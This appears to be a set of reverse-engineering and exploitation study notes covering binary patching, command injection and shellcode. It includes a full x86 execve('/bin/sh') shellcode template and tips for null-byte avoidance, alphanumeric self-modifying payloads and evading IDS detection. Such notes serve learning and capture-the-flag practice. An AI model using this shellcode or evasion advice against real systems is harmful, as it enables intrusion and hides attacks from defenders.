# Common Techniques
These are many common techniques used in different reverse engineering problems.
## Binary Patching
- https://materials.rangeforce.com/tutorial/2020/04/12/Patching-Binaries/
- can be done easily in a decompiler like ida or ghidra
## Command Line Injection
  - changing system file paths
## Shellcode
  - execve(sh, argv, envp): executes the shell
    - sh: is the file
    - argv: multiple argument vector
    - envp: environment variable vector
  - vector in C is ended with NULL to tell how many items are in the vector
  -  don't `use mov eax, 0` don't want a null byte in the payload
  -  al is the lowest byte of eax
  -  envp will be the second element of argv
  -  if execve is blocked there are plenty of other system calls that can be used
  -  write concise shellcode because ids systems will block anything too long
     -  use the stack
     -  use `xor`
     -  use `cbw` and its variant
     -  staging shellcode in environment variables
     -  leverage context 
        -  what is already in registers
  - if you are only using alphanumeric chars
    - construct the real shellcode on the stack at runtime
      - this technique is known as self modifying shellcode
    - this will easily fool ids systems
    - http://phrack.org/issues/57/15.html#article
    - ex.
        ```
        movw $0, %ax   ; 0x66 0xb8 0x00, 0x00, 0x00 (not allowed)
        ->
        andw $0x454e, %ax 
        andw $0x3a31, %ax
        ```
  - it is possible to write exploits that are system blind
    - one technique is opening emulators for each architecture and brute force the byte combinations
  -  useful template for shellcode
``` 
#include <sys/syscall.h> 
#define STRING  "/bin/sh"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+4)

.intel_syntax noprefix
.text

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  pop    esi                    /* esi points to STRING */
  mov    [ARGV+esi],esi         /* set up argv[0] pointer to pathname */
  xor    eax,eax                /* get a 32-bit zero value */
  mov    [STRLEN + esi],al      /* null-terminate our string */
  mov    [ENVP + esi], eax      /* set up null envp */

  mov    al,SYS_execve          /* syscall number */
  mov    ebx,esi                /* arg 1: string pathname */
  lea    ecx,[ARGV + esi]       /* arg 2: argv */
  lea    edx,[ENVP + esi]       /* arg 3: envp */
  int    0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */

  xor    ebx,ebx                /* arg 1: 0 */
  mov    eax,ebx
  inc    eax                    /* exit(0) */
  /* mov+inc to avoid null byte */
  int    0x80                   /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING 
  ```
  - can inject shellcode through stack, env variables, file names, and arguments

## Security Protections
- nx being disabled means that memory spaces such as the stack are executable